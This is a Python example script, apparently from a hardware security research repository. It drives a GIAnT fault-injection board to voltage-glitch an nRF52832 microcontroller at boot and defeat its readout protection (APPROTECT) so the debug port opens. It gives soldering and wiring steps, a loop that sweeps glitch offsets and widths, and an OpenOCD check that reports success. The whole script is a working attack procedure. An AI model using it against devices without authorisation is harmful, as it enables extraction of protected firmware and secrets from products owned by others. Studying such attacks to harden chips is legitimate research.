"""
This example shows how to glitch the loading of APPROTECT from the UICR (in flash)
to bypass CRP on the nRF52832.
Based on example_lpc1343.py in this repo.

For this to work, the following connections are needed:

- Solder a wire to DEC1 on the nRF and connect it to T1 on the GIAnT
  (T1 shorts to ground when the fault is injected).
- It may be necessary to remove the capacitor on DEC1.
- Connect VCC on the nRF to DAC output on the GIAnT, and GND to GND.
- Connect SWDIO and SWDCLK on the nRF to those pins on an ST-LINK or
  similar.

**IMPORTANT NOTE**: Also download
https://github.com/openocd-org/openocd/blob/master/tcl/target/nrf52.cfg
to the directory you're running this from.

Example success:
    b'Open On-Chip Debugger 0.11.0\n...Info : nrf52.cpu: hardware has 6 breakpoints...'
    Success!
    w = 120, o = 1069000
"""

import time
import serial as ser
import uu
from glitcher import glitcher
import logging
from fpga import *
from gpio import gpio
import subprocess


def check_protected():
    try:
        output = subprocess.check_output(
            [
                'openocd', '-f', 'interface/stlink.cfg',
                '-f', 'nrf52.cfg', '-c',
                'init;exit'
            ],
            stderr=subprocess.STDOUT
        )
        if "6 breakpoints" in str(output):
            print(str(output))
            return False
    except Exception as e:
        print(e)
        pass
    return True


def main():
    logging.basicConfig(level = logging.INFO)

    gl = glitcher()
    gl.reset_fpga() 
    gl.dac.setTestModeEnabled(0)
    gl.dac.setRfidModeEnabled(0)
    
    io = gpio()

    # Trigger when DAC power high (uc VCC high)
    gl.dac.setTriggerEnableState(
        Register_Bits.FI_TRIGGER_CONTROL_DAC_POWER.value,
        True
    )
    
    # Offsets
    offset_start = 1050000
    offset_end = 1309000
    offset_step = 1000
    
    # Width range
    w_start = 100
    w_end = 250
    w_step = 10
    
    # Repeat each attempt how many times?
    repeat = 2
    
    # Loop state
    run = True
    w = w_start
    offset = offset_start
    r = 0

    # Both fault voltage and normal voltage are 3.3V.
    # We want the fault on T1, not on DAC power.
    gl.set_voltages(3.3, 3.3, 0)
    gl.dac.setEnabled(False)

    while run:
        print("Attempting to glitch...")
        print("w = {:d}, o = {:d}, repeat = {:d}".format(w, offset, r))
        # Turn off uc
        gl.dac.setEnabled(False)
        time.sleep(0.05)
        
        # Clean up any previous pulses
        gl.dac.clearPulses()
    
        # Set a pulse
        gl.add_pulse(offset, w)
        
        # Arm the fault
        gl.dac.arm()
        
        # Bring uc out of reset. This will also trigger the glitch
        gl.dac.setEnabled(True)
        time.sleep(0.05)
        
        # Now check if we succeeded
        protected = check_protected()
        
        if protected:
            print("Protected! Next parameter.")
            
            # Next param
            if r < repeat:
                r = r + 1
            elif w < w_end:
                r = 0
                w = w + w_step
            elif offset < offset_end:
                w = w_start
                offset = offset + offset_step
            else:
                run = False
        elif not protected:
            print("Success!")
            print("w = {:d}, o = {:d}".format(w, offset))
            run = False
    
    gl.close()


if __name__=="__main__":
    main()
